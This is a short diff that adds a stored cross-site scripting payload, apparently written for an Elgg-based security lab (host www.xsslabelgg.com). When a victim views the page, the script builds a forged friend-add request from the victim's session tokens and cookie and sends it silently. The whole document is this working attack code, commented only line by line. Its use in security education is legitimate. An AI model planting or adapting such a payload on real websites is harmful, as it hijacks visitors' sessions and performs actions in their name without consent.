@@ -1,0 +1,18 @@
+//Starting the script here.
+<script  type="text/javascript">
+var Ajax =null;
+//Framing the URL with reference to the GET request.
+ var sendurl = "/action/friends/add?friend="+elgg.page_owner.guid + "&__elgg_ts=" +                                                                                       elgg.security.token.__elgg_ts + "&__elgg_token="+elgg.security.token.__elgg_token;
+//Ajax GET request.
+ Ajax = new XMLHttpRequest();
+ Ajax.open("GET",sendurl, true);
+ Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+ Ajax.setRequestHeader("Keep-Alive","300");
+ Ajax.setRequestHeader("connection","keep-alive");
+ Ajax.setRequestHeader("Cookie", document.cookie);
+ Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+
+//Sending the GET request
+Ajax.send();
+  </script>
+//Ending the script.
